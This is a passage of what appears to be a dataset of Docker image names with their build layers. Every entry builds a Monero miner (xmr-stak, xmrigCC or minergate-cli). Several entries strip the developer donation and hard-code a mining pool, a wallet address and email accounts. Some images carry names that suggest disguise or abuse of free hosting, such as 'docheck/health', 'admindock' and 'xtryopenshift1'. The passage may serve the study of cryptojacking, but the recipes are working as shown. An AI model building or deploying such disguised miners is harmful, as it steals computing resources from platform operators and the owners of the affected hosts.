--strict - && rm cudasign.pub &&     echo "deb https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64 /" > /etc/apt/sources.list.d/cuda.list &&     echo "deb https://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1604/x86_64 /" > /etc/apt/sources.list.d/nvidia-ml.list\nENV CUDA_VERSION=9.0.176\nENV CUDA_PKG_VERSION=9-0=9.0.176-1\nRUN apt-get update && apt-get install -y --no-install-recommends         cuda-cudart-$CUDA_PKG_VERSION &&     ln -s cuda-9.0 /usr/local/cuda &&     rm -rf /var/lib/apt/lists/*\nLABEL com.nvidia.volumes.needed=nvidia_driver\nLABEL com.nvidia.cuda.version=9.0.176\nRUN echo "/usr/local/nvidia/lib" >> /etc/ld.so.conf.d/nvidia.conf &&     echo "/usr/local/nvidia/lib64" >> /etc/ld.so.conf.d/nvidia.conf\nENV PATH=/usr/local/nvidia/bin:/usr/local/cuda/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nENV LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64\nENV NVIDIA_VISIBLE_DEVICES=all\nENV NVIDIA_DRIVER_CAPABILITIES=compute,utility\nENV NVIDIA_REQUIRE_CUDA=cuda>=9.0\nLABEL com.nvidia.build.id=69002227 com.nvidia.build.ref=7b1cef2dbb8f0b94806586491692211571198b7f\nENV GIT_REPOSITORY=https://github.com/tobym/xmr-stak.git\nENV XMRSTAK_CMAKE_FLAGS=-DXMR-STAK_COMPILE=generic -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF\nRUN apt-get update     && set -x     && apt-get install -qq --no-install-recommends -y build-essential ca-certificates cmake cuda-core-9-0 git cuda-cudart-dev-9-0 libhwloc-dev libmicrohttpd-dev libssl-dev     && git clone $GIT_REPOSITORY     && cd /xmr-stak     && cmake ${XMRSTAK_CMAKE_FLAGS} .     && make     && cd -     && mv /xmr-stak/bin/* /usr/local/bin/     && rm -rf /xmr-stak     && apt-get purge -y -qq build-essential cmake cuda-core-9-0 git cuda-cudart-dev-9-0 libhwloc-dev libmicrohttpd-dev libssl-dev     && apt-get clean -qq\nRUN echo vm.nr_hugepages=128 >> /etc/sysctl.conf     && echo \'* soft memlock 262144\' >> /etc/security/limits.conf     && echo \'* hard memlock 262144\' >> /etc/security/limits.conf\nVOLUME /mnt\nWORKDIR /mnt\nENTRYPOINT ["/usr/local/bin/xmr-stak"]\nRUN mkdir -p /app\nCOPY multi:17b14773bc3804c1dd8bb891a891e666e9bcc994ce37e04f59b9c77f5094514e /app/\nWORKDIR /app\nENTRYPOINT ["/usr/local/bin/xmr-stak"]'
docheck/ax; b'ADD file:093f0723fa46f6cdbd6f7bd146448bb70ecce54254c35701feeceb956414622f /\nCMD ["/bin/sh"]\nRUN adduser -S -D -H -h /xmrigCC miner\nRUN apk --no-cache upgrade &&       apk --no-cache add       git       cmake       libuv-dev       build-base &&       git clone https://github.com/Bendr0id/xmrigCC.git  &&       cd xmrigCC &&       mkdir build &&       sed -i -e \'s/constexpr const int kDonateLevel = 5;/constexpr const int kDonateLevel = 0;/g\' src/donate.h &&       cmake -DWITH_CC_SERVER=OFF -DWITH_HTTPD=OFF -DWITH_TLS=OFF . &&       make -j$(nproc) &&       apk del         build-base         cmake         git\nADD file:3435374e783ffafcfca6bff70a1d7d661fb8d09d3f20b6a81d5319e5b662c2b6 /xmrigCC/config.json\nUSER miner\nWORKDIR /xmrigCC\nENTRYPOINT ["./xmrigDaemon"]\nADD file:1fbd3b89946605d960b917c9eb36d7a76c22b13d31eec2ab167a8c72d323d5cb /xmrigCC/config.json\nENTRYPOINT ["/xmrigCC/xmrigDaemon"]'
docheck/health; b'ADD file:093f0723fa46f6cdbd6f7bd146448bb70ecce54254c35701feeceb956414622f /\nCMD ["/bin/sh"]\nRUN adduser -S -D -H -h /xmrigCC miner\nRUN apk --no-cache upgrade &&       apk --no-cache add       git       cmake       libuv-dev       build-base &&       git clone https://github.com/Bendr0id/xmrigCC.git  &&       cd xmrigCC &&       mkdir build &&       sed -i -e \'s/constexpr const int kDonateLevel = 5;/constexpr const int kDonateLevel = 0;/g\' src/donate.h &&       cmake -DWITH_CC_SERVER=OFF -DWITH_HTTPD=OFF -DWITH_TLS=OFF . &&       make -j$(nproc) &&       apk del         build-base         cmake         git\nADD file:3435374e783ffafcfca6bff70a1d7d661fb8d09d3f20b6a81d5319e5b662c2b6 /xmrigCC/config.json\nUSER miner\nWORKDIR /xmrigCC\nENTRYPOINT ["./xmrigDaemon"]\nADD file:1fbd3b89946605d960b917c9eb36d7a76c22b13d31eec2ab167a8c72d323d5cb /xmrigCC/config.json\nENTRYPOINT ["/xmrigCC/xmrigDaemon"]'
dibvor/min; b'ADD file:f5a2d04c3f3cafada15eb32e4e8d971e48ef11724939c399a8664bf498111e67 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         ca-certificates         wget         libxcb1         libpcre16-3     && rm -r /var/lib/apt/lists/*\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli     && dpkg -i *.deb     && rm *.deb\nENTRYPOINT ["minergate-cli"]\nCMD ["-user c.m@gmail.com -xmr"]'
deme3us/dc-k8s; b'ADD file:280a445783f309c90ab928883d98e4326c1fbe19927c8a555da41bcb74c71a45 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         libmicrohttpd10         libssl1.0.0     && rm -r /var/lib/apt/lists/*\nENV XMR_STAK_CPU_VERSION=v1.1.0-1.2.0\nRUN set -x     && buildDeps=\'         ca-certificates         cmake         curl         g++         libmicrohttpd-dev         libssl-dev         make     \'     && apt-get -qq update     && apt-get -qq --no-install-recommends install $buildDeps     && rm -rf /var/lib/apt/lists/*         && mkdir -p /usr/local/src/xmr-stak-cpu/build     && cd /usr/local/src/xmr-stak-cpu/     && curl -sL https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_CPU_VERSION.tar.gz | tar -xz --strip-components=1     && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h     && cd build     && cmake ..     && make -j$(nproc)     && cp bin/xmr-stak-cpu /usr/local/bin/     && sed -r         -e \'s/^("pool_address" : ).*,/\\1"pool.supportxmr.com:3333",/\'         -e \'s/^("wallet_address" : ).*,/\\1"42PcauxhF9GVm8Ekeb6c8SV65AFdhEJvkfdv3GxJdMzXSpyjRWDZkXbbMc9zGdwHQ4LifCXoXRB1AEYMYfbrfbgi38HU8xr",/\'         -e \'s/^("pool_password" : ).*,/\\1"dc-k8s:deme3us@gmail.com",/\'         ../config.txt > /usr/local/etc/config.txt         && rm -r /usr/local/src/xmr-stak-cpu     && apt-get -qq --auto-remove purge $buildDeps\nENTRYPOINT ["xmr-stak-cpu"]\nCMD ["/usr/local/etc/config.txt"]'
deme3us/dc-jl-x3; b'ADD file:280a445783f309c90ab928883d98e4326c1fbe19927c8a555da41bcb74c71a45 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         libmicrohttpd10         libssl1.0.0     && rm -r /var/lib/apt/lists/*\nENV XMR_STAK_CPU_VERSION=v1.1.0-1.2.0\nRUN set -x     && buildDeps=\'         ca-certificates         cmake         curl         g++         libmicrohttpd-dev         libssl-dev         make     \'     && apt-get -qq update     && apt-get -qq --no-install-recommends install $buildDeps     && rm -rf /var/lib/apt/lists/*         && mkdir -p /usr/local/src/xmr-stak-cpu/build     && cd /usr/local/src/xmr-stak-cpu/     && curl -sL https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_CPU_VERSION.tar.gz | tar -xz --strip-components=1     && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h     && cd build     && cmake ..     && make -j$(nproc)     && cp bin/xmr-stak-cpu /usr/local/bin/     && sed -r         -e \'s/^("pool_address" : ).*,/\\1"pool.supportxmr.com:3333",/\'         -e \'s/^("wallet_address" : ).*,/\\1"42PcauxhF9GVm8Ekeb6c8SV65AFdhEJvkfdv3GxJdMzXSpyjRWDZkXbbMc9zGdwHQ4LifCXoXRB1AEYMYfbrfbgi38HU8xr",/\'         -e \'s/^("pool_password" : ).*,/\\1"dc-jl-x3:deme3us@gmail.com",/\'         ../config.txt > /usr/local/etc/config.txt         && rm -r /usr/local/src/xmr-stak-cpu     && apt-get -qq --auto-remove purge $buildDeps\nENTRYPOINT ["xmr-stak-cpu"]\nCMD ["/usr/local/etc/config.txt"]'
nathanjubotin/admindock; b'ADD file:01a5c4f2b1dcc8f8aebe00ce8ed6ceda7038abc31d40caf69273240cdd453b84 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         ca-certificates         wget \tlibxcb1 \tlibpcre16-3     && rm -r /var/lib/apt/lists/*\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli     && dpkg -i *.deb     && rm *.deb\nENTRYPOINT ["minergate-cli"]\nCMD ["--user yexsg3yzmn1ssqz --xmr 1"]'
nathanjubotin/dockeradmin; b'ADD file:01a5c4f2b1dcc8f8aebe00ce8ed6ceda7038abc31d40caf69273240cdd453b84 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         ca-certificates         wget \tlibxcb1 \tlibpcre16-3     && rm -r /var/lib/apt/lists/*\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli     && dpkg -i *.deb     && rm *.deb\nENTRYPOINT ["minergate-cli"]\nCMD ["--user yexsg3yzmn1ssqz --xmr 1"]'
deme3us/dc-jl-x2; b'ADD file:280a445783f309c90ab928883d98e4326c1fbe19927c8a555da41bcb74c71a45 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         libmicrohttpd10         libssl1.0.0     && rm -r /var/lib/apt/lists/*\nENV XMR_STAK_CPU_VERSION=v1.1.0-1.2.0\nRUN set -x     && buildDeps=\'         ca-certificates         cmake         curl         g++         libmicrohttpd-dev         libssl-dev         make     \'     && apt-get -qq update     && apt-get -qq --no-install-recommends install $buildDeps     && rm -rf /var/lib/apt/lists/*         && mkdir -p /usr/local/src/xmr-stak-cpu/build     && cd /usr/local/src/xmr-stak-cpu/     && curl -sL https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_CPU_VERSION.tar.gz | tar -xz --strip-components=1     && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h     && cd build     && cmake ..     && make -j$(nproc)     && cp bin/xmr-stak-cpu /usr/local/bin/     && sed -r         -e \'s/^("pool_address" : ).*,/\\1"pool.supportxmr.com:3333",/\'         -e \'s/^("wallet_address" : ).*,/\\1"42PcauxhF9GVm8Ekeb6c8SV65AFdhEJvkfdv3GxJdMzXSpyjRWDZkXbbMc9zGdwHQ4LifCXoXRB1AEYMYfbrfbgi38HU8xr",/\'         -e \'s/^("pool_password" : ).*,/\\1"dc-jl-x2:deme3us@gmail.com",/\'         ../config.txt > /usr/local/etc/config.txt         && rm -r /usr/local/src/xmr-stak-cpu     && apt-get -qq --auto-remove purge $buildDeps\nENTRYPOINT ["xmr-stak-cpu"]\nCMD ["/usr/local/etc/config.txt"]'
deme3us/cd-jl-x; b'ADD file:280a445783f309c90ab928883d98e4326c1fbe19927c8a555da41bcb74c71a45 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         libmicrohttpd10         libssl1.0.0     && rm -r /var/lib/apt/lists/*\nENV XMR_STAK_CPU_VERSION=v1.1.0-1.2.0\nRUN set -x     && buildDeps=\'         ca-certificates         cmake         curl         g++         libmicrohttpd-dev         libssl-dev         make     \'     && apt-get -qq update     && apt-get -qq --no-install-recommends install $buildDeps     && rm -rf /var/lib/apt/lists/*         && mkdir -p /usr/local/src/xmr-stak-cpu/build     && cd /usr/local/src/xmr-stak-cpu/     && curl -sL https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_CPU_VERSION.tar.gz | tar -xz --strip-components=1     && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h     && cd build     && cmake ..     && make -j$(nproc)     && cp bin/xmr-stak-cpu /usr/local/bin/     && sed -r         -e \'s/^("pool_address" : ).*,/\\1"pool.supportxmr.com:3333",/\'         -e \'s/^("wallet_address" : ).*,/\\1"42PcauxhF9GVm8Ekeb6c8SV65AFdhEJvkfdv3GxJdMzXSpyjRWDZkXbbMc9zGdwHQ4LifCXoXRB1AEYMYfbrfbgi38HU8xr",/\'         -e \'s/^("pool_password" : ).*,/\\1"dc-jl-x:deme3us@gmail.com",/\'         ../config.txt > /usr/local/etc/config.txt         && rm -r /usr/local/src/xmr-stak-cpu     && apt-get -qq --auto-remove purge $buildDeps\nENTRYPOINT ["xmr-stak-cpu"]\nCMD ["/usr/local/etc/config.txt"]'
deme3us/xtryopenshift1; b'ADD file:280a445783f309c90ab928883d98e4326c1fbe19927c8a555da41bcb74c71a45 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         libmicrohttpd10         libssl1.0.0     && rm -r /var/lib/apt/lists/*\nENV XMR_STAK_CPU_VERSION=v1.1.0-1.2.0\nRUN set -x     && buildDeps=\'         ca-certificates         cmake         curl         g++         libmicrohttpd-dev         libssl-dev         make     \'     && apt-get -qq update     && apt-get -qq --no-install-recommends install $buildDeps     && rm -rf /var/lib/apt/lists/*         && mkdir -p /usr/local/src/xmr-stak-cpu/build     && cd /usr/local/src/xmr-stak-cpu/     && curl -sL https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_CPU_VERSION.tar.gz | tar -xz --strip-components=1     && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h     && cd build     && cmake ..     && make -j$(nproc)     && cp bin/xmr-stak-cpu /usr/local/bin/     && sed -r         -e \'s/^("pool_address" : ).*,/\\1"pool.supportxmr.com:3333",/\'         -e \'s/^("wallet_address" : ).*,/\\1"42PcauxhF9GVm8Ekeb6c8SV65AFdhEJvkfdv3GxJdMzXSpyjRWDZkXbbMc9zGdwHQ4LifCXoXRB1AEYMYfbrfbgi38HU8xr",/\'         -e \'s/^("pool_password" : ).*,/\\1"openshift:deme3us@gmail.com",/\'         ../config.txt > /usr/local/etc/config.txt         && rm -r /usr/local/src/xmr-stak-cpu     && apt-get -qq --auto-remove purge $buildDeps\nENTRYPOINT ["xmr-stak-cpu"]\nCMD ["/usr/local/etc/config.txt"]'
srmcguirt/x1; b'ADD file:280a445783f309c90ab928883d98e4326c1fbe19927c8a555da41bcb74c71a45 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         ca-certificates         wget     && rm -r /var/lib/apt/lists/*\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli     && dpkg -i *.deb     && rm *.deb\nENTRYPOINT ["minergate-cli"]\nCMD ["-user srmcguirt@gmail.com -xmr"]'
